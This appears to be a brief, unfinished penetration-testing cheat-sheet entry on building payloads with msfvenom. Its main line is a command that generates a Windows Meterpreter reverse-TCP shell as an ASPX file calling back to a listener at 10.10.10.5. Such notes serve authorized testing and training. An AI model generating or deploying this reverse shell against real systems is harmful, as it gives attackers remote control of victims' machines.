# Payload Creation

## Using msfvenom

* We can use msfvenom to either create payload in text, used in Buffer overflow exploits, or, create a paylaod file, that could be directly run on vulnerable machine.

### Payload Selection

### Payload creation

* Generally,
  * msfvenom -p windows/meterpreter/reverse\_tcp LHOST=10.10.10.5 LPORT=123 -f aspx &gt; rev\_shell.aspx



